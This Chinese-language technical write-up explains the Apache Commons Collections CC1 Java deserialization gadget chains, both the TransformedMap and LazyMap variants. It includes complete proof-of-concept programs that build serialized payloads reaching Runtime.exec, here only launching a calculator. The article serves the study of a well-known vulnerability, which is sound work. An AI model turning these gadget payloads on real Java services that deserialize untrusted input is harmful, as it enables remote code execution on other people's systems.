---
comments: true
tags:
    - Web Sec
    - Java
---
# Apache Commons Collections反序列化漏洞

Apache Commons是Apache开源的Java通用类项目，在Java中项目中被广泛的使用，Apache Commons当中有一个组件叫做`Apache Commons Collections`，主要封装了Java的Collection（集合）相关类对象。本节将逐步详解Collections反序列化攻击链(仅以TransformedMap调用链为示例)最终实现反序列化RCE。


## 1 CC1-TransformedMap
### Transformer

`Transformer`是`org.apache.commons.collections.Transformer`接口的实现类，`Transformer`接口定义了一个`transform`方法，用于对输入的对象进行转换。
```java title="org.apache.commons.collections.Transformer"
    /**
     * 将输入对象（保持不变）转换为某个输出对象。
     *
     * @param input  需要转换的对象，应保持不变
     * @return 一个已转换的对象
     * @throws ClassCastException (runtime) 如果输入是错误的类
     * @throws IllegalArgumentException (runtime) 如果输入无效
     * @throws FunctorException (runtime) 如果转换无法完成
     */
    public interface Transformer {
        Object transform(Object input);
    }
```

该接口的重要实现类有：`ConstantTransformer`、`invokerTransformer`、`ChainedTransformer`、`TransformedMap`

### ConstantTransformer

ConstantTransformer，常量转换：传入对象不会经过任何改变直接返回。

```java title="org.apache.commons.collections.functors.ConstantTransformer"
package org.apache.commons.collections.functors;

import java.io.Serializable;
import org.apache.commons.collections.Transformer;

public class ConstantTransformer implements Transformer, Serializable {

    private static final long serialVersionUID = 6374440726369055124L;

    /** 每次都返回null */
    public static final Transformer NULL_INSTANCE = new ConstantTransformer(null);

    /** The closures to call in turn */
    private final Object iConstant;

    public static Transformer getInstance(Object constantToReturn) {
        if (constantToReturn == null) {
            return NULL_INSTANCE;
        }

        return new ConstantTransformer(constantToReturn);
    }

    public ConstantTransformer(Object constantToReturn) {
        super();
        iConstant = constantToReturn;
    }

    public Object transform(Object input) {
        return iConstant;
    }

    public Object getConstant() {
        return iConstant;
    }
}
```

### InvokerTransformer

`org.apache.commons.collections.functors.InvokerTransformer`实现了`java.io.Serializable`接口。2015年有研究者发现利用`InvokerTransformer`类的`transform`方法可以实现Java反序列化RCE，并提供了利用方法：[ysoserial CC1](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java){target="_blank"}

`InvokerTransformer`类的`transform`方法通过反射调用指定对象的方法，返回方法执行结果。

```java title="org.apache.commons.collections.functors.InvokerTransformer"
public class InvokerTransformer implements Transformer, Serializable {

    private static final long serialVersionUID = -8653385846894047688L;

    /** 要调用的方法名称 */
    private final String iMethodName;

    /** 反射参数类型数组 */
    private final Class[] iParamTypes;

    /** 反射参数值数组 */
    private final Object[] iArgs;

    ···

    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        super();
        iMethodName = methodName;
        iParamTypes = paramTypes;
        iArgs = args;
    }

    public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
              // 获取输入类的类对象
            Class cls = input.getClass();

              // 通过输入的方法名和方法参数，获取指定的反射方法对象
            Method method = cls.getMethod(iMethodName, iParamTypes);

              // 反射调用指定的方法并返回方法调用结果
            return method.invoke(input, iArgs);
        } catch (Exception ex) {
            // 省去异常处理部分代码
        }
    }
}
```

### ChainedTransformer

`org.apache.commons.collections.functors.ChainedTransformer` 类封装了`Transformer`的链式调用，对于传入的`Transformer`数组，`ChainedTransformer`依次调用每一个`Transformer`的`transform`方法。

```java title="org.apache.commons.collections.functors.ChainedTransformer"
public class ChainedTransformer implements Transformer, Serializable {

  /** The transformers to call in turn */
  private final Transformer[] iTransformers;

  ...

  public ChainedTransformer(Transformer[] transformers) {
      super();
      iTransformers = transformers;
  }
  public Object transform(Object object) {
      for (int i = 0; i < iTransformers.length; i++) {
          object = iTransformers[i].transform(object);
      }
      return object;
  }
}
```

??? example "使用ChainedTransformer实现调用本地命令执行方法"

    ```java
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;

    public class ChainTransformer {

        public static void main(String[] args) throws Exception {
            // 定义需要执行的本地系统命令
            String cmd = "calc.exe";

            // ChainedTransformer调用链分解

    //        // new ConstantTransformer(Runtime.class
    //        Class<?> runtimeClass = Runtime.class;
    //
    //        // new InvokerTransformer("getMethod", new Class[]{
    //        //         String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
    //        // ),
    //        Class  cls1       = runtimeClass.getClass();
    //        Method getMethod  = cls1.getMethod("getMethod", new Class[]{String.class, Class[].class});
    //        Method getRuntime = (Method) getMethod.invoke(runtimeClass, new Object[]{"getRuntime", new Class[0]});
    //
    //        // new InvokerTransformer("invoke", new Class[]{
    //        //         Object.class, Object[].class}, new Object[]{null, new Object[0]}
    //        // )
    //        Class   cls2         = getRuntime.getClass();
    //        Method  invokeMethod = cls2.getMethod("invoke", new Class[]{Object.class, Object[].class});
    //        Runtime runtime      = (Runtime) invokeMethod.invoke(getRuntime, new Object[]{null, new Class[0]});
    //
    //        // new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
    //        Class  cls3       = runtime.getClass();
    //        Method execMethod = cls3.getMethod("exec", new Class[]{String.class});
    //        execMethod.invoke(runtime, cmd);

            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{
                            String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
                    ),
                    new InvokerTransformer("invoke", new Class[]{
                            Object.class, Object[].class}, new Object[]{null, new Object[0]}
                    ),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
            };

            // 创建ChainedTransformer调用链对象
            Transformer transformedChain = new ChainedTransformer(transformers);

            // 执行对象转换操作
            Object transform = transformedChain.transform(null);

            System.out.println(transform);
        }

    }
    ```
    运行结果如下：
    ![alt text](img/11.png)

### 利用InvokerTransformer执行本地命令

现在我们已经使用`InvokerTransformer`创建了一个含有恶意调用链的Transformer类的Map对象，紧接着我们应该思考如何才能够将调用链串起来并执行。

`org.apache.commons.collections.map.TransformedMap`类间接的实现了`java.util.Map`接口，同时支持对Map的key或者value进行Transformer转换，调用`decorate`和`decorateTransform`方法就可以创建一个`TransformedMap`:

```java title="org.apache.commons.collections.map.TransformedMap"
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
      return new TransformedMap(map, keyTransformer, valueTransformer);
}

public static Map decorateTransform(Map map, Transformer keyTransformer, Transformer valueTransformer) {
      ...
}
```

调用`TransformedMap`的`setValue`/`put`/`putAll`中的任意方法都会调用`transform`方法，从而也就会触发命令执行：

??? example "使用 TransformedMap类的setValue触发transform示例："

    ```java
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;

    import java.util.HashMap;
    import java.util.Map;

    public class TransformedMapTest {

        public static void main(String[] args) {
            String cmd = "calc.exe";

            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{
                            String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
                    ),
                    new InvokerTransformer("invoke", new Class[]{
                            Object.class, Object[].class}, new Object[]{null, new Object[0]}
                    ),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
            };

            // 创建ChainedTransformer调用链对象
            Transformer transformedChain = new ChainedTransformer(transformers);

            // 创建Map对象
            Map map = new HashMap();
            map.put("value", "value");

            // 使用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象
            Map transformedMap = TransformedMap.decorate(map, null, transformedChain);

            // transformedMap.put("v1", "v2");// 执行put也会触发transform

            // 遍历Map元素，并调用setValue方法
            for (Object obj : transformedMap.entrySet()) {
                Map.Entry entry = (Map.Entry) obj;

                // setValue最终调用到InvokerTransformer的transform方法,从而触发Runtime命令执行调用链
                entry.setValue("test");
            }

            System.out.println(transformedMap);
        }

    }
    ```
    运行结果如下：

    ![alt text](img/10.png)

任何一个类只要符合以下条件，我们就可以在Java反序列化的时候触发`InvokerTransformer`类的`transform`方法实现RCE：

1. 实现了`java.io.Serializable`接口
2. 并且可以传入我们构建的`TransformedMap`对象
3. 调用了`TransformedMap`中的`setValue`/`put`/`putAll`中的任意方法一个方法的类

### AnnotationInvocationHandler

`sun.reflect.annotation.AnnotationInvocationHandler`类实现了`java.lang.reflect.InvocationHandler`(Java动态代理)接口和`java.io.Serializable`接口，它还重写了`readObject`方法，在`readObject`方法中间接的调用了`TransformedMap中MapEntry`的`setValue`方法，从而完成了整个攻击链的调用。

```java title="sun.reflect.annotation.AnnotationInvocationHandler" linenums="1"
package sun.reflect.annotation;

class AnnotationInvocationHandler implements InvocationHandler, Serializable {

    AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {...}

    // Java动态代理的invoke方法
    public Object invoke(Object var1, Method var2, Object[] var3) {...}

    private void readObject(java.io.ObjectInputStream s)throws java.io.IOException, ClassNotFoundException {
        s.defaultReadObject();

        // Check to make sure that types have not evolved incompatibly

        AnnotationType annotationType = null;
        try {
            annotationType = AnnotationType.getInstance(type);
        } catch(IllegalArgumentException e) {
            // Class is no longer an annotation type; time to punch out
            throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map<String, Class<?>> memberTypes = annotationType.memberTypes();

        // If there are annotation members without values, that
        // situation is handled by the invoke method.
        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
            String name = memberValue.getKey();
            Class<?> memberType = memberTypes.get(name);
            if (memberType != null) {  // i.e. member still exists
                Object value = memberValue.getValue();
                if (!(memberType.isInstance(value) ||
                      value instanceof ExceptionProxy)) {
                    memberValue.setValue(
                        new AnnotationTypeMismatchExceptionProxy(
                            value.getClass() + "[" + value + "]").setMember(
                                annotationType.members().get(name)));
                }
            }
        }
    }
}
```

其中第11行 `s.defaultReadObject();` 反序列化生成 `memberValues` 对象，即我们传入的 `TransformMap`。需要注意的是如果我们想要进入到`memberValue.setValue`这个逻辑需要满足以下两个要求：

1. `sun.reflect.annotation.AnnotationInvocationHandler` 构造函数的第一个参数必须是 `Annotation`的子类，且其中必须含有至少一个方法，假设方法名是X
2. 被`TransformedMap`修饰的Map中必须有一个键名为X的元素


因为`sun.reflect.annotation.AnnotationInvocationHandler`是一个内部API专用的类，我们需要通过反射的方式创建出`AnnotationInvocationHandler`对象：

???+ example "创建AnnotationInvocationHandler对象"

    ```java
    // 创建Map对象
    Map map = new HashMap();

    // map的key名称必须对应创建AnnotationInvocationHandler时使用的注解方法名，比如创建
    // AnnotationInvocationHandler时传入的注解是java.lang.annotation.Target，那么map
    // 的key必须是@Target注解中的方法名，即：value，否则在反序列化AnnotationInvocationHandler
    // 类调用其自身实现的readObject方法时无法调用setValue方法。
    map.put("value", "123");

    // 使用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象
    Map transformedMap = TransformedMap.decorate(map, null, transformedChain);

    // 获取AnnotationInvocationHandler类对象
    Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

    // 获取AnnotationInvocationHandler类的构造方法
    Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);

    // 设置构造方法的访问权限
    constructor.setAccessible(true);

    // 创建含有恶意攻击链(transformedMap)的AnnotationInvocationHandler类实例，等价于：
    // Object instance = new AnnotationInvocationHandler(Target.class, transformedMap);
    Object instance = constructor.newInstance(Target.class, transformedMap);
    ```
### PoC

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class cc1 {
    public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class,
                        Class[].class }, new Object[] { "getRuntime",
                        new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class,
                        Object[].class }, new Object[] { null, new Object[0]
                }),
                new InvokerTransformer("exec", new Class[] { String.class },
                        new String[] {
                                "calc" }),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("value", "123");
        Map outerMap = TransformedMap.decorate(innerMap, null,
                transformerChain);
        Class clazz =
                Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class,
                Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler)
                construct.newInstance(Retention.class, outerMap);
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(handler);
        oos.close();
        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new
                ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```

## 2 CC1-LazyMap

!!! tips "版本要求"

    jdk版本：jdk8u71以下
    
    commons-collections版本：

    ```xml
    <dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>
        </dependency>
    </dependencies>
    ```

LazyMap链的后半部分与TransformedMap相同，区别在于LazyMap替换了TransformedMap

### LazyMap
ChainedTransformer的transform方法通过FindUsages查询发现也可以在LazyMap中找到，并且factory也非常好控制

CC1链核心就是找到触发`ChainedTransformer.transform`方法的位置，通过find usage发现lazymap的get方法中调用了transform方法

![alt text](img/8.png)

```java title="org.apache.commons.collections.map.LazyMap"
    public Object get(Object key) {
        // create value for key if key is not currently in the map
        if (map.containsKey(key) == false) {
            Object value = factory.transform(key);
            map.put(key, value);
            return value;
        }
        return map.get(key);
    }
```

需要满足条件`map.containsKey(key) == false`，即key不存在即可触发transform方法

LazyMap类的构造方法如下

```java
    protected LazyMap(Map map, Factory factory) {
        super(map);
        if (factory == null) {
            throw new IllegalArgumentException("Factory must not be null");
        }
        this.factory = FactoryTransformer.getInstance(factory);
    }
```

发现factory变量可控，但该构造方法为protected，无法直接调用，搜索发现decorate方法可以调用该构造方法

```java
    public static Map decorate(Map map, Factory factory) {
        return new LazyMap(map, factory);
    }
```

测试get方法触发transform方法

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.util.HashMap;
import java.util.Map;

public class lazymap {

    public static void main(String[] args) throws Exception {
        // 定义需要执行的本地系统命令
        String cmd = "calc.exe";
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
        };

        // 创建ChainedTransformer调用链对象
        Transformer transformedChain = new ChainedTransformer(transformers);

        HashMap<Object,Object> hash = new HashMap<>();
        Map decorate = LazyMap.decorate(hash, transformedChain);
        decorate.get("");
    }
}
```

成功弹出计算器：

![alt text](img/9.png){loading="lazy"}

### AnnotationInvocationHandler

接下来考虑如何触发 LazyMap 对象的get方法，在 AnnotationInvocationHandler 的 invoke 方法中

```java
    public Object invoke(Object proxy, Method method, Object[] args) {
        String member = method.getName();
        Class<?>[] paramTypes = method.getParameterTypes();

        // Handle Object and Annotation methods
        if (member.equals("equals") && paramTypes.length == 1 &&
            paramTypes[0] == Object.class)
            return equalsImpl(args[0]);
        assert paramTypes.length == 0;
        if (member.equals("toString"))
            return toStringImpl();
        if (member.equals("hashCode"))
            return hashCodeImpl();
        if (member.equals("annotationType"))
            return type;

        // Handle annotation member accessors
        Object result = memberValues.get(member);

        if (result == null)
            throw new IncompleteAnnotationException(type, member);

        if (result instanceof ExceptionProxy)
            throw ((ExceptionProxy) result).generateException();

        if (result.getClass().isArray() && Array.getLength(result) != 0)
            result = cloneArray(result);

        return result;
    }
```

为了绕过前面两条if语句的判断，我们构造的map需要满足：

1. 调用方法名不在if中
2. 参数个数为0

随后我们考虑如何将该类的 memberValues 变量设置为我们构造的 LazyMap 对象。该类的构造方法是private的，因此无法直接调用。

但联系到此前学习的动态代理知识，AnnotationInvocationHandler 类实现了 InvocationHandler 接口，可以作为动态代理的代理处理器，调用使用该代理处理器的代理对象中方法之前会自动执行重写的invoke方法。

因此，我们只需要创建一个代理对象，通过反射使其代理处理器为 AnnotationInvocationHandler 类的实例，无参调用代理对象的任意方法，即可触发invoke方法。

最后寻找无参调用代理对象的方法，就近使用readObject中的循环语句 ```for (Map.Entry<String, Object> memberValue : memberValues.entrySet())``` 。只要触发readObject方法即可

回顾总结利用链：
1. 通过反射获取`AnnotationInvocationHandler`类构造方法
2. 用`AnnotationInvocationHandler`类作为代理处理器创建代理对象`proxyInstance`
3. 再次用反射创建`AnnotationInvocationHandler`类对象 o，将其`memberValues`变量设置为`proxyInstance`
4. 序列化并反序列化o，此时触发`readObject`方法
5. `readobject` 方法中无参调用了`proxyInstance.entrySet()`，因此 Instance (`AnnotationInvocationHandler`的实例) 的 `invoke` 方法被调用
6. 在`invoke`方法中触发`memberValues.get`方法，其`memberValues`变量被设置为`LazyMap`对象，最终触发`transform`实现RCE

Gadget chain:
```java
ObjectInputStream.readObject()
	AnnotationInvocationHandler.readObject()
		Map(proxyInstance).entrySet()
			AnnotationInvocationHandler.invoke()
				LazyMap.get()
					ChainedTransformer.transform()
						ConstantTransformer.transform()
						InvokerTransformer.transform()
							Method.invoke()
								Class.getMethod()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.getRuntime()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.exec()
```

### PoC

IDEA 调试的时候遇到了奇怪的问题，执行完 Proxy.newProxyInstance 之后，程序就开始弹出计算器，原因未知。

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class cc11 {
    public static void main(String[] args) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException {

        //定义一系列Transformer对象,组成一个变换链
        Transformer[] transformers = new Transformer[]{
                //返回Runtime.class
                new ConstantTransformer(Runtime.class),
                //通过反射调用getRuntime()方法获取Runtime对象
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null}),
                //通过反射调用invoke()方法
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                //通过反射调用exec()方法启动计算器
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        //将多个Transformer对象组合成一个链
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object,Object> hash = new HashMap<>();
        //使用chainedTransformer装饰HashMap生成新的Map
        Map decorate = LazyMap.decorate(hash, chainedTransformer);

        //通过反射获取AnnotationInvocationHandler类的构造方法
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
        //设置构造方法为可访问的
        constructor.setAccessible(true);
        //通过反射创建 Override 类的代理对象 instance,并设置其调用会委托给 decorate 对象
        InvocationHandler instance = (InvocationHandler) constructor.newInstance(Override.class, decorate);

        //创建Map接口的代理对象proxyInstance,并设置其调用处理器为instance
        Map proxyInstance = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, instance);
        //再次通过反射创建代理对象
        Object o = constructor.newInstance(Override.class, proxyInstance);

        serialize(o);
        unserialize("1.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream out = new ObjectOutputStream(Files.newOutputStream(Paths.get("1.bin")));
        out.writeObject(obj);
    }

    public static void unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream out = new ObjectInputStream(Files.newInputStream(Paths.get(filename)));
        out.readObject();
    }

}
```

## 参考资料


1. [Commons-Collections反序列化漏洞复现](https://www.cnblogs.com/BUTLER/p/16478574.html){target="_blank"}
2. [Java安全 CC链1分析(Lazymap类)](https://blog.csdn.net/Elite__zhb/article/details/136097084){target="_blank"}